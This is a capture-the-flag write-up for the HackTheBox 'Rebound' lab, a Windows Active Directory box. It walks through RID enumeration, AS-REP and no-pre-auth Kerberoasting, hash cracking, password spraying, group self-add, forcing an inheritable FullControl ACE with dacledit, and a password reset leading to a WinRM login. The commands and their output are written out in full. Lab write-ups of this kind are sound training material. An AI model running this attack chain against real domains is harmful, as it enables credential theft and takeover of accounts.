HackTheBox: Rebound

2026-10-02 · 13 min read

Rebound is a hard Active Directory box (rebound.htb). A RID-brute user list feeds a no-pre-auth Kerberoast, a cracked service ticket is reused across accounts, and a BloodHound-guided chain — group self-add, then forcing ACL inheritance down an OU with dacledit — resets a service account for the user flag. This writeup covers the box up to the user flag.

Reconnaissance

nmap -Pn -p- -sC -sV 10.129.232.31

88/tcp  kerberos-sec   (domain: rebound.htb, dc01.rebound.htb)
389/tcp ldap
445/tcp microsoft-ds
5985/tcp http          WinRM

SMB & RID enumeration

Guest can read a couple of shares (nothing useful in them) but, importantly, can still be used to cycle RIDs and recover the full user list:

ridenum 10.129.232.31 500 20000 Guest ''
Domain Sid: S-1-5-21-4078382237-1492182817-2568127209
  Administrator  Guest  krbtgt  DC01$  ppaul  llune  fflock
  jjones  mmalone  nnoon  ldap_monitor  oorend  winrm_svc
  batch_runner  tbrady  delegator$

AS-REP + no-pre-auth Kerberoast

An AS-REP roast across the list shows jjones has pre-authentication disabled:

impacket-GetNPUsers -usersfile reboundusers.txt rebound.htb/ -dc-ip 10.129.232.31
$krb5asrep$23$jjones@REBOUND.HTB:...

Because jjones needs no pre-auth, it can be used as the requesting principal to Kerberoast without a password (-no-preauth), which returns service tickets for several accounts:

impacket-GetUserSPNs -no-preauth jjones -usersfile reboundusers.txt -dc-host 10.129.232.31 rebound.htb/
$krb5tgs$...ldap_monitor...
$krb5tgs$...delegator...
$krb5tgs$...DC01$...

The ldap_monitor ticket cracks against rockyou:

hashcat -m 13100 ldap_monitor_hash rockyou.txt
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$...:1GR8t@$$4u

Password reuse → oorend

The password authenticates as ldap_monitor, and a BloodHound collection runs over LDAP with Kerberos. Spraying that same password across the user list shows it is reused by oorend:

nxc smb 10.129.232.31 -u reboundusers.txt -p '1GR8t@$$4u' --continue-on-success
[+] rebound.htb\ldap_monitor:1GR8t@$$4u
[+] rebound.htb\oorend:1GR8t@$$4u

Group self-add + forced ACL inheritance → user flag

oorend can add itself to the ServiceMgmt group, which has full control over the Service Users OU:

powerview rebound.htb/oorend:...@dc01.rebound.htb ...
Add-DomainGroupMember -Identity "SERVICEMGMT" -Members oorend
Full control over an OU is not automatically full control over the users inside it — those ACEs are not inherited by default. But with full control over the OU you can add a new ACE that is marked inheritable, so it trickles down to the child objects. The clean, OPSEC-safe route here is Shadow Credentials via Certipy; this writeup took the simpler password-reset path.

Use Impacket's dacledit to write an inheritable FullControl ACE on the OU, which then applies to winrm_svc:

impacket-getTGT 'rebound.htb'/'oorend':'1GR8t@$$4u' -dc-ip rebound.htb
export KRB5CCNAME=oorend.ccache

dacledit.py -k -no-pass -action write -rights FullControl \
  -principal oorend -target-dn 'OU=Service Users,DC=rebound,DC=htb' \
  -inheritance 'rebound.htb'/'oorend' -use-ldaps -dc-ip rebound.htb
[*] DACL modified successfully!

With inherited control over winrm_svc, reset its password and WinRM in for the user flag:

bloodyAD -d rebound.htb -k --host dc01.rebound.htb set password winrm_svc 'Password@1'
evil-winrm -i dc01.rebound.htb -u winrm_svc -p 'Password@1'
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
That is the user flag. The path to root continues from the delegator$ ticket and a Shadow-Credentials/Certipy step against the DC — out of scope for this writeup, which stops at user.
